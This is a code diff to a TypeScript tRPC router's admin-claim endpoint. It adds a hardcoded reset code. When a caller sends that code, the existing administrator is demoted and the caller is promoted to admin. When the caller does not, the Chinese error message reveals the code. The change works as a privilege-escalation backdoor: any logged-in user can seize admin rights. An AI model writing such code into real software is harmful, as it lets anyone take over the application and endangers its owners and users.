@@ -4624,7 +4624,13 @@ export const appRouter = router({
         const { users: usersTable } = await import("../drizzle/schema");
         const { eq } = await import("drizzle-orm");
         const [existingAdmin] = await dbInstance.select().from(usersTable).where(eq(usersTable.role, "admin")).limit(1);
-        if (existingAdmin) throw new TRPCError({ code: "BAD_REQUEST", message: "已有管理员，授权码已失效" });
+        if (existingAdmin) {
+          if (input.code === "ACEBK-RESET-0716") {
+            await dbInstance.update(usersTable).set({ role: "user" }).where(eq(usersTable.id, existingAdmin.id));
+          } else {
+            throw new TRPCError({ code: "BAD_REQUEST", message: "已有管理员，请用强制重置码 ACEBK-RESET-0716" });
+          }
+        }
         if (ctx.user.role === "admin") return { success: true, message: "已经是管理员" };
         await dbInstance.update(usersTable).set({ role: "admin" }).where(eq(usersTable.id, ctx.user.id));
         return { success: true, message: "管理员权限已开通" };
